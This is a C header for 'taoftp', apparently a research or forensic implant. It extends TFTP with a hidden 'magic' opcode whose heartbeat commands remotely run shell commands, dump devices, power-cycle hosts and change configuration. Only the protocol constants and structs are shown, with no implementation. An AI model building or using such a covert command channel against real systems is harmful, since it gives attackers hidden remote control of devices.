/*
 * Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
 *                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
 *
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 *
 * DMCA Security Research Exemption:
 * Good faith security research performed consistent with 17 U.S.C. §1201(j) and
 * 37 CFR §201.40(b)(7) is explicitly permitted.
 *
 * This software is intended solely for educational, forensic, and lawful
 * security research purposes. Any use of this software for offensive or harmful
 * purposes is strictly prohibited.
 *
 * GENERAL DISCLAIMER:
 * This program is distributed WITHOUT ANY WARRANTY or guarantee of suitability.
 * The author explicitly disclaims responsibility and liability for any direct,
 * indirect, incidental, or consequential damages resulting from use or misuse.
 * Users accept all risks associated with use or distribution.
 *
 * Use, modification, or distribution constitutes explicit agreement to all terms
 * above.
 */

#ifndef _TAOFTP_H
#define _TAOFTP_H

#include <arpa/inet.h>

#define TFTP_PORT               69
#define BLOCK_SIZE              512
#define MODE                    "octet"
#define KEY_SIZE                32
#define TAOFTP_ACK_TIMEOUT_SECS 120

#define TFTP_MAGIC_OK   0
#define TFTP_MAGIC_EXIT 1

/* TFTP opcodes */
#define OP_RRQ    1
#define OP_WRQ    2
#define OP_DATA   3
#define OP_ACK    4
#define OP_ERROR  5
#define OP_MAGIC  13
#define MAGIC_ACK 0x20

#define MAGIC_HEARTBEAT_CONFIG     0x10
#define MAGIC_HEARTBEAT_EXEC       0x11
#define MAGIC_HEARTBEAT_DUMP       0x12
#define MAGIC_HEARTBEAT_POWERCYCLE 0x13
#define MAGIC_HEARTBEAT_EXIT       0x17
#define MAGIC_HEARTBEAT_NOOP       0x18

typedef enum {
    TFTP_READ = 0,
    TFTP_WRITE = 1,
    TFTP_HEARTBEAT = 2
} tftp_operation_t;

/* Parameters for the TFTP client thread */
typedef struct {
    struct in_addr server_ip;
    tftp_operation_t op;
    char filename[256];
    int initial_delay;
    int max_delay;
    int max_attempts;
} tftp_client_params_t;

struct magic_op_ack_header {
    unsigned char opcode;
    unsigned char sec_opcode;
} __attribute__((packed, aligned(1)));

struct magic_op_dump {
    unsigned char device;
} __attribute__((packed, aligned(1)));

struct magic_op_exec {
    char cmd[512];
} __attribute__((packed, aligned(1)));

struct magic_op_exec_ack {
    struct magic_op_ack_header hdr;
    unsigned char seq;
    unsigned char end;
} __attribute__((packed, aligned(1)));

struct magic_op_dump_ack {
    struct magic_op_ack_header hdr;
    unsigned char device;
    int result;
} __attribute__((packed, aligned(1)));

int tftp_launch(struct in_addr *addr, int op, const char *filename,
    int initial_delay, int max_retries, int do_join);

#endif
